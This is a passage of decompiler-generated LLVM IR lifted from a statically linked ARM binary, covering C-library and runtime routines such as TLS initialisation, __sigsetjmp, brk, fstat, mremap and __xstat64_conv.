  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_179f4.1606 to i32))
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_1e634 = load i32, i32* %sl.global-to-local, align 4
  %v2_1e634 = add i32 %v0_1e634, 96
  %v3_1e634 = inttoptr i32 %v2_1e634 to i32*
  %v4_1e634 = load i32, i32* %v3_1e634, align 4
  store i32 %v4_1e634, i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 28260, i32* %r1.global-to-local, align 4
  %v2_1e640 = add i32 %v0_1e634, 68
  %v3_1e640 = inttoptr i32 %v2_1e640 to i32*
  %v4_1e640 = load i32, i32* %v3_1e640, align 4
  store i32 %v4_1e640, i32* %r0.global-to-local, align 4
  %v3_1e648 = add i32 %v0_1e634, 28260
  %v4_1e648 = inttoptr i32 %v3_1e648 to i32*
  store i32 64, i32* %v4_1e648, align 4
  %v1_1e650 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e650 = add i32 %v1_1e650, 20
  %v3_1e650 = inttoptr i32 %v2_1e650 to i32*
  store i32 %stack_var_-44.3, i32* %v3_1e650, align 4
  %v1_1e658 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e658 = add i32 %v1_1e658, 24
  %v3_1e658 = inttoptr i32 %v2_1e658 to i32*
  store i32 %stack_var_-48.3, i32* %v3_1e658, align 4
  %v1_1e660 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e660 = inttoptr i32 %v1_1e660 to i32*
  store i32 1, i32* %v2_1e660, align 4
  %v1_1e668 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e668 = add i32 %v1_1e668, 28
  %v3_1e668 = inttoptr i32 %v2_1e668 to i32*
  store i32 %stack_var_-52.3, i32* %v3_1e668, align 4
  %v0_1e670 = load i32, i32* @r6, align 4
  %v2_1e670 = icmp eq i32 %v0_1e670, 0
  %v1_1e674 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e674 = add i32 %v1_1e674, 44
  %v3_1e674 = inttoptr i32 %v2_1e674 to i32*
  store i32 1, i32* %v3_1e674, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1e67c = load i32, i32* %sl.global-to-local, align 4
  %v1_1e67c = load i32, i32* %r1.global-to-local, align 4
  %v2_1e67c = add i32 %v1_1e67c, %v0_1e67c
  store i32 %v2_1e67c, i32* %r2.global-to-local, align 4
  %v1_1e680 = load i32, i32* @r6, align 4
  br i1 %v2_1e670, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_1e594
  store i32 %v1_1e680, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1e68c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e68c35 = add i32 %v1_1e68c34, 32
  %v3_1e68c36 = inttoptr i32 %v2_1e68c35 to i32*
  store i32 %v1_1e680, i32* %v3_1e68c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_1e594
  %v2_1e684 = add i32 %v1_1e680, -1
  store i32 %v2_1e684, i32* %r0.global-to-local, align 4
  %v1_1e68c = load i32, i32* %r8.global-to-local, align 4
  %v2_1e68c = add i32 %v1_1e68c, 32
  %v3_1e68c = inttoptr i32 %v2_1e68c to i32*
  store i32 %v1_1e680, i32* %v3_1e68c, align 4
  %v1_1e690 = load i32, i32* @r6, align 4
  store i32 %v1_1e690, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_1e694 = load i32, i32* %r8.global-to-local, align 4
  %v1_1e694 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e694 = add i32 %v1_1e694, 28
  %v3_1e694 = inttoptr i32 %v2_1e694 to i32*
  store i32 %v0_1e694, i32* %v3_1e694, align 4
  %v0_1e698 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e698 = load i32, i32* %ip.global-to-local, align 4
  %v2_1e698 = inttoptr i32 %v1_1e698 to i32*
  store i32 %v0_1e698, i32* %v2_1e698, align 4
  %v0_1e69c = load i32, i32* %r0.global-to-local, align 4
  %v1_1e69c = load i32, i32* %r3.global-to-local, align 4
  %v2_1e69c = add i32 %v1_1e69c, %v0_1e69c
  store i32 %v2_1e69c, i32* %r0.global-to-local, align 4
  %v1_1e6a0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_1e670, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_1e6a8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_1e6a8 = phi i32 [ %v0_1e6a8.pre, %._crit_edge ], [ %v1_1e6a0, %bb54 ]
  %v2_1e6a4 = udiv i32 %v2_1e69c, %v1_1e6a0
  %v2_1e6a8 = load i32, i32* %sb.global-to-local, align 4
  %v3_1e6a8 = mul i32 %v2_1e6a4, %v0_1e6a8
  %v4_1e6a8 = add i32 %v2_1e6a8, %v3_1e6a8
  store i32 %v4_1e6a8, i32* @r0, align 4
  %v0_1e6ac = load i32, i32* %fp.global-to-local, align 4
  %v2_1e6ac = icmp ult i32 %v0_1e6ac, 16
  %v0_1e6ac. = select i1 %v2_1e6ac, i32 16, i32 %v0_1e6ac
  store i32 %v0_1e6ac., i32* @r1, align 4
  %v2_1e6bc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1e6bc, i32* @r4, align 4
  store i32 %v6_1e4d8, i32* @r5, align 4
  store i32 %v15_1e4d8, i32* %r8.global-to-local, align 4
  store i32 %v18_1e4d8, i32* %sb.global-to-local, align 4
  store i32 %v21_1e4d8, i32* %sl.global-to-local, align 4
  store i32 %v24_1e4d8, i32* %fp.global-to-local, align 4
  store i32 %v27_1e4d8, i32* @lr, align 4
  %v0_1e6c0 = call i32 @init_static_tls()
  store i32 %v0_1e6c0, i32* %r0.global-to-local, align 4
  %v0_1e6cc.pre = load i32, i32* @ip, align 4
  %v1_1e594.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_1e5a4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1e6c4

dec_label_pc_1e550.dec_label_pc_1e6c4.loopexit_crit_edge: ; preds = %dec_label_pc_1e54c
  br label %dec_label_pc_1e6c4.loopexit

dec_label_pc_1e6c4.loopexit:                      ; preds = %dec_label_pc_1e550.dec_label_pc_1e6c4.loopexit_crit_edge, %dec_label_pc_1e504
  br label %dec_label_pc_1e6c4

dec_label_pc_1e6c4:                               ; preds = %dec_label_pc_1e6c4.loopexit, %entry, %bb55
  %v0_1e5a4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_32024.1324 to i32), %dec_label_pc_1e6c4.loopexit ], [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ], [ %v0_1e5a4.pre.pre.pre, %bb55 ]
  %v1_1e594.pre.pre = phi i32 [ %v0_1e4f8, %dec_label_pc_1e6c4.loopexit ], [ %v0_1e4f8, %entry ], [ %v1_1e594.pre.pre.pre, %bb55 ]
  %v0_1e6cc = phi i32 [ %v0_1e4fc, %dec_label_pc_1e6c4.loopexit ], [ %v0_1e4fc, %entry ], [ %v0_1e6cc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1e6cc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1e590

; uselistorder directives
  uselistorder i32 %v0_1e6cc, { 1, 0 }
  uselistorder i32 %v1_1e680, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1e5ec, { 1, 0 }
  uselistorder i32 %v2_1e5e8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1e54c, { 2, 1, 0 }
  uselistorder i32 %v3_1e524, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1e52c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_1e550, { 1, 0 }
  uselistorder i32 %v0_1e4fc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_1e4f8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1e4ec, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 28260, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1e6c4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_1e594, { 1, 0 }
  uselistorder label %dec_label_pc_1e590, { 1, 0 }
  uselistorder label %dec_label_pc_1e514, { 1, 0 }
}

define i32 @function_1e6e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e6e4:
  %v0_1e6e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e6e4, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_1e6e4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1e6e4, %bb
  %v9_1e704 = phi i32 [ %arg1, %dec_label_pc_1e6e4 ], [ 0, %bb ]
  ret i32 %v9_1e704

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_1e710 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_1e710
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v4_1e720 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 172) to i32*), align 4
  %v4_1e728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 116) to i32*), align 4
  store i32 %v4_1e728, i32* %r1.global-to-local, align 4
  %v1_1e72c = add i32 %arg1, 44
  %v2_1e72c = inttoptr i32 %v1_1e72c to i32*
  %v3_1e72c = load i32, i32* %v2_1e72c, align 4
  %v1_1e730 = add i32 %arg1, 28
  %v2_1e730 = inttoptr i32 %v1_1e730 to i32*
  %v3_1e730 = load i32, i32* %v2_1e730, align 4
  store i32 %v3_1e730, i32* %r2.global-to-local, align 4
  %v2_1e734 = inttoptr i32 %v4_1e720 to i32*
  store i32 %v3_1e72c, i32* %v2_1e734, align 4
  %v0_1e738 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e738 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e738 = inttoptr i32 %v1_1e738 to i32*
  store i32 %v0_1e738, i32* %v2_1e738, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 172) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1e744(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e744:
  %v0_1e744 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e744, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e744
  %v2_1e744 = load i32, i32* @ip, align 4
  %v5_1e744 = udiv i32 %v2_1e744, 2
  %v6_1e744 = and i32 %v5_1e744, %arg1
  %v2_1e748 = load i32, i32* @r4, align 4
  %v4_1e748 = lshr i32 %v2_1e748, %v6_1e744
  %v5_1e748 = sub nsw i32 32, %v6_1e744
  %v6_1e748 = shl i32 %v2_1e748, %v5_1e748
  %v7_1e748 = or i32 %v6_1e748, %v4_1e748
  %v9_1e748 = and i32 %v7_1e748, %v6_1e744
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e744, %bb
  %v10_1e748 = phi i32 [ %arg1, %dec_label_pc_1e744 ], [ %v9_1e748, %bb ]
  ret i32 %v10_1e748

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_1e754 = add i32 %arg1, 40
  store i32 %v1_1e754, i32* %r2.global-to-local, align 4
  %v1_1e758 = inttoptr i32 %v1_1e754 to i32*
  %v2_1e758 = load i32, i32* %v1_1e758, align 4
  store i32 %v2_1e758, i32* %r2.global-to-local, align 4
  %v3_1e758 = add i32 %arg1, 44
  %v4_1e758 = inttoptr i32 %v3_1e758 to i32*
  %v5_1e758 = load i32, i32* %v4_1e758, align 4
  store i32 %v5_1e758, i32* %r3.global-to-local, align 4
  %v0_1e75c = call i32 @__aeabi_read_tp()
  %v1_1e760 = inttoptr i32 %v0_1e75c to i32*
  %v2_1e760 = load i32, i32* %v1_1e760, align 4
  store i32 %v2_1e760, i32* %r1.global-to-local, align 4
  %v3_1e764 = mul i32 %v5_1e758, 8
  store i32 %v3_1e764, i32* %r3.global-to-local, align 4
  %v1_1e768 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e768 = add i32 %v1_1e768, %v0_1e75c
  %v3_1e76c = add i32 %v3_1e764, %v2_1e760
  %v4_1e76c = inttoptr i32 %v3_1e76c to i32*
  store i32 %v2_1e768, i32* %v4_1e76c, align 4
  %v0_1e770 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e770 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e770 = add i32 %v1_1e770, %v0_1e770
  store i32 %v2_1e770, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_1e778 = add i32 %v2_1e770, 4
  %v5_1e778 = inttoptr i32 %v4_1e778 to i8*
  store i8 1, i8* %v5_1e778, align 1
  %v0_1e77c = load i32, i32* @r4, align 4
  %v1_1e77c = add i32 %v0_1e77c, 20
  store i32 %v1_1e77c, i32* %r1.global-to-local, align 4
  %v1_1e780 = inttoptr i32 %v1_1e77c to i32*
  %v2_1e780 = load i32, i32* %v1_1e780, align 4
  store i32 %v2_1e780, i32* @r1, align 4
  %v3_1e780 = add i32 %v0_1e77c, 24
  %v4_1e780 = inttoptr i32 %v3_1e780 to i32*
  %v5_1e780 = load i32, i32* %v4_1e780, align 4
  store i32 %v5_1e780, i32* %r2.global-to-local, align 4
  %v5_1e784 = call i32 @__GI_mempcpy(i32 %v2_1e768, i32 %v2_1e780, i32 %v5_1e780, i32 1)
  %v0_1e788 = load i32, i32* @r4, align 4
  %v1_1e788 = add i32 %v0_1e788, 28
  store i32 %v1_1e788, i32* %r3.global-to-local, align 4
  %v1_1e78c = inttoptr i32 %v1_1e788 to i32*
  %v2_1e78c = load i32, i32* %v1_1e78c, align 4
  store i32 %v2_1e78c, i32* %r2.global-to-local, align 4
  %v3_1e78c = add i32 %v0_1e788, 24
  %v4_1e78c = inttoptr i32 %v3_1e78c to i32*
  %v5_1e78c = load i32, i32* %v4_1e78c, align 4
  store i32 %v5_1e78c, i32* %r3.global-to-local, align 4
  %v2_1e790 = sub i32 %v5_1e78c, %v2_1e78c
  store i32 %v2_1e790, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1e798 = inttoptr i32 %v5_1e784 to i8*
  %v4_1e798 = call i32 @__GI_memset(i8* %v3_1e798, i32 0, i32 %v2_1e790)
  ret i32 %v4_1e798

; uselistorder directives
  uselistorder i32 %v3_1e764, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 5, 4, 1, 6, 7, 8, 9, 10, 0, 28, 29, 26, 27, 24, 25, 23, 21, 22, 20, 17, 18, 19, 14, 15, 12, 13, 2, 3, 16, 11, 30 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e7e8:
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 29088) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1e7fc = load i32, i32* @r0, align 4
  %v1_1e800 = inttoptr i32 %v0_1e7fc to i32*
  %v2_1e800 = load i32, i32* @r4, align 4
  store i32 %v2_1e800, i32* %v1_1e800, align 4
  %v3_1e800 = add i32 %v0_1e7fc, 4
  %v4_1e800 = inttoptr i32 %v3_1e800 to i32*
  %v5_1e800 = load i32, i32* @r5, align 4
  store i32 %v5_1e800, i32* %v4_1e800, align 4
  %v6_1e800 = add i32 %v0_1e7fc, 8
  %v7_1e800 = inttoptr i32 %v6_1e800 to i32*
  %v8_1e800 = load i32, i32* @r6, align 4
  store i32 %v8_1e800, i32* %v7_1e800, align 4
  %v9_1e800 = add i32 %v0_1e7fc, 12
  %v10_1e800 = inttoptr i32 %v9_1e800 to i32*
  %v11_1e800 = load i32, i32* @r7, align 4
  store i32 %v11_1e800, i32* %v10_1e800, align 4
  %v12_1e800 = add i32 %v0_1e7fc, 16
  %v13_1e800 = inttoptr i32 %v12_1e800 to i32*
  %v14_1e800 = load i32, i32* @r8, align 4
  store i32 %v14_1e800, i32* %v13_1e800, align 4
  %v15_1e800 = add i32 %v0_1e7fc, 20
  %v16_1e800 = inttoptr i32 %v15_1e800 to i32*
  %v17_1e800 = load i32, i32* @sb, align 4
  store i32 %v17_1e800, i32* %v16_1e800, align 4
  %v18_1e800 = add i32 %v0_1e7fc, 24
  %v19_1e800 = inttoptr i32 %v18_1e800 to i32*
  %v20_1e800 = load i32, i32* @sl, align 4
  store i32 %v20_1e800, i32* %v19_1e800, align 4
  %v21_1e800 = add i32 %v0_1e7fc, 28
  %v22_1e800 = inttoptr i32 %v21_1e800 to i32*
  %v23_1e800 = load i32, i32* @fp, align 4
  store i32 %v23_1e800, i32* %v22_1e800, align 4
  %v24_1e800 = add i32 %v0_1e7fc, 32
  %v25_1e800 = inttoptr i32 %v24_1e800 to i32*
  %v27_1e800 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_1e800, i32* %v25_1e800, align 4
  %v28_1e800 = add i32 %v0_1e7fc, 36
  %v29_1e800 = inttoptr i32 %v28_1e800 to i32*
  %v30_1e800 = load i32, i32* @lr, align 4
  store i32 %v30_1e800, i32* %v29_1e800, align 4
  %v0_1e804 = call i32 @__sigjmp_save()
  ret i32 %v0_1e804

; uselistorder directives
  uselistorder i32 %v0_1e7fc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1e810 = load i32, i32* @r1, align 4
  store i32 %v0_1e810, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_1e820 = load i32, i32* @r0, align 4
  store i32 %v0_1e820, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1e820, -4095
  br i1 %tmp, label %dec_label_pc_1e848, label %dec_label_pc_1e82c

dec_label_pc_1e82c:                               ; preds = %entry
  %v0_1e830 = call i32 @__aeabi_read_tp()
  %v3_1e834 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1e834 = sext i16 %v3_1e834 to i32
  store i32 %v4_1e834, i32* @r3, align 4
  %v0_1e838 = load i32, i32* @r2, align 4
  %v1_1e838 = sub i32 0, %v0_1e838
  store i32 %v1_1e838, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_1e840 = add i32 %v4_1e834, %v0_1e830
  %v4_1e840 = inttoptr i32 %v3_1e840 to i32*
  store i32 %v1_1e838, i32* %v4_1e840, align 4
  br label %dec_label_pc_1e858

dec_label_pc_1e848:                               ; preds = %entry
  store i32 %v0_1e820, i32* %r7.global-to-local, align 4
  %v2_1e848 = icmp eq i32 %v0_1e820, 0
  br i1 %v2_1e848, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e848
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e848, %bb
  call void @__pseudo_cond_branch(i1 %v2_1e848, i32 ptrtoint (i32* @global_var_1e97c.1803 to i32))
  br label %dec_label_pc_1e858

dec_label_pc_1e858:                               ; preds = %dec_label_pc_1e82c, %.thread
  %v0_1e858 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1e858

; uselistorder directives
  uselistorder i32 %v0_1e820, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1e858, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1e86c = load i32, i32* @r4, align 4
  store i32 %v3_1e86c, i32* %stack_var_-12, align 4
  %v0_1e87c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1e87c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e87c, -4095
  br i1 %tmp, label %dec_label_pc_1e8a4, label %dec_label_pc_1e88c

dec_label_pc_1e88c:                               ; preds = %entry
  %v0_1e890 = call i32 @__aeabi_read_tp()
  %v3_1e894 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1e894 = sext i16 %v3_1e894 to i32
  %v0_1e898 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e898 = sub i32 0, %v0_1e898
  store i32 %v1_1e898, i32* %r2.global-to-local, align 4
  %v3_1e89c = add i32 %v4_1e894, %v0_1e890
  %v4_1e89c = inttoptr i32 %v3_1e89c to i32*
  store i32 %v1_1e898, i32* %v4_1e89c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1e8a4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1e8a4

dec_label_pc_1e8a4:                               ; preds = %entry, %dec_label_pc_1e88c
  %v1_1e8a8 = phi i32 [ %v0_1e87c, %entry ], [ -1, %dec_label_pc_1e88c ]
  %v2_1e8a4 = phi i32 [ %v3_1e86c, %entry ], [ %v2_1e8a4.pre, %dec_label_pc_1e88c ]
  store i32 %v2_1e8a4, i32* @r4, align 4
  ret i32 %v1_1e8a8

; uselistorder directives
  uselistorder i32 %v0_1e87c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e8a4, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1e8b0 = load i32, i32* @r4, align 4
  store i32 %v3_1e8b0, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_1e8c8 = inttoptr i32 %arg2 to i8*
  %v4_1e8c8 = call i32 @__GI_memset(i8* %v3_1e8c8, i32 0, i32 104)
  %v2_1e8cc = load i32, i32* %arg1, align 4
  store i32 %v2_1e8cc, i32* %r3.global-to-local, align 4
  %v3_1e8cc = add i32 %tmp, 4
  %v4_1e8cc = inttoptr i32 %v3_1e8cc to i32*
  %v5_1e8cc = load i32, i32* %v4_1e8cc, align 4
  store i32 %v5_1e8cc, i32* %r4.global-to-local, align 4
  %v0_1e8d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e8d0 = inttoptr i32 %v0_1e8d0 to i32*
  store i32 %v2_1e8cc, i32* %v1_1e8d0, align 4
  %v3_1e8d0 = add i32 %v0_1e8d0, 4
  %v4_1e8d0 = inttoptr i32 %v3_1e8d0 to i32*
  %v5_1e8d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1e8d0, i32* %v4_1e8d0, align 4
  %v0_1e8d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e8d4 = add i32 %v0_1e8d4, 12
  %v2_1e8d4 = inttoptr i32 %v1_1e8d4 to i32*
  %v3_1e8d4 = load i32, i32* %v2_1e8d4, align 4
  %v1_1e8d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e8d8 = add i32 %v1_1e8d8, 12
  %v3_1e8d8 = inttoptr i32 %v2_1e8d8 to i32*
  store i32 %v3_1e8d4, i32* %v3_1e8d8, align 4
  %v0_1e8dc = load i32, i32* %r6.global-to-local, align 4
  %v1_1e8dc = add i32 %v0_1e8dc, 96
  store i32 %v1_1e8dc, i32* %r3.global-to-local, align 4
  %v1_1e8e0 = inttoptr i32 %v1_1e8dc to i32*
  %v2_1e8e0 = load i32, i32* %v1_1e8e0, align 4
  store i32 %v2_1e8e0, i32* %r3.global-to-local, align 4
  %v3_1e8e0 = add i32 %v0_1e8dc, 100
  %v4_1e8e0 = inttoptr i32 %v3_1e8e0 to i32*
  %v5_1e8e0 = load i32, i32* %v4_1e8e0, align 4
  store i32 %v5_1e8e0, i32* %r4.global-to-local, align 4
  %v1_1e8e4 = add i32 %v0_1e8dc, 56
  %v2_1e8e4 = inttoptr i32 %v1_1e8e4 to i32*
  %v3_1e8e4 = load i32, i32* %v2_1e8e4, align 4
  store i32 %v3_1e8e4, i32* %r2.global-to-local, align 4
  %v1_1e8e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e8e8 = add i32 %v1_1e8e8, 96
  %v3_1e8e8 = inttoptr i32 %v2_1e8e8 to i32*
  store i32 %v2_1e8e0, i32* %v3_1e8e8, align 4
  %v0_1e8ec = load i32, i32* %r4.global-to-local, align 4
  %v1_1e8ec = load i32, i32* %r5.global-to-local, align 4
  %v2_1e8ec = add i32 %v1_1e8ec, 100
  %v3_1e8ec = inttoptr i32 %v2_1e8ec to i32*
  store i32 %v0_1e8ec, i32* %v3_1e8ec, align 4
  %v0_1e8f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1e8f0 = add i32 %v0_1e8f0, 24
  store i32 %v1_1e8f0, i32* %ip.global-to-local, align 4
  %v1_1e8f4 = inttoptr i32 %v1_1e8f0 to i32*
  %v2_1e8f4 = load i32, i32* %v1_1e8f4, align 4
  store i32 %v2_1e8f4, i32* %ip.global-to-local, align 4
  %v3_1e8f4 = add i32 %v0_1e8f0, 28
  %v4_1e8f4 = inttoptr i32 %v3_1e8f4 to i32*
  %v5_1e8f4 = load i32, i32* %v4_1e8f4, align 4
  store i32 %v5_1e8f4, i32* %lr.global-to-local, align 4
  %v0_1e8f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e8f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e8f8 = add i32 %v1_1e8f8, 56
  %v3_1e8f8 = inttoptr i32 %v2_1e8f8 to i32*
  store i32 %v0_1e8f8, i32* %v3_1e8f8, align 4
  %v0_1e8fc = load i32, i32* %r6.global-to-local, align 4
  %v1_1e8fc = add i32 %v0_1e8fc, 72
  store i32 %v1_1e8fc, i32* %r3.global-to-local, align 4
  %v1_1e900 = add i32 %v0_1e8fc, 32
  store i32 %v1_1e900, i32* %r7.global-to-local, align 4
  %v1_1e904 = inttoptr i32 %v1_1e900 to i32*
  %v2_1e904 = load i32, i32* %v1_1e904, align 4
  store i32 %v2_1e904, i32* %r7.global-to-local, align 4
  %v3_1e904 = add i32 %v0_1e8fc, 36
  %v4_1e904 = inttoptr i32 %v3_1e904 to i32*
  %v5_1e904 = load i32, i32* %v4_1e904, align 4
  store i32 %v5_1e904, i32* %r8.global-to-local, align 4
  %v1_1e908 = inttoptr i32 %v1_1e8fc to i32*
  %v2_1e908 = load i32, i32* %v1_1e908, align 4
  %v3_1e908 = add i32 %v0_1e8fc, 76
  %v4_1e908 = inttoptr i32 %v3_1e908 to i32*
  %v5_1e908 = load i32, i32* %v4_1e908, align 4
  store i32 %v5_1e908, i32* %r1.global-to-local, align 4
  %v0_1e90c = load i32, i32* %r5.global-to-local, align 4
  %v1_1e90c = add i32 %v0_1e90c, 72
  %v1_1e910 = inttoptr i32 %v1_1e90c to i32*
  store i32 %v2_1e908, i32* %v1_1e910, align 4
  %v3_1e910 = add i32 %v0_1e90c, 76
  %v4_1e910 = inttoptr i32 %v3_1e910 to i32*
  %v5_1e910 = load i32, i32* %r1.global-to-local, align 4
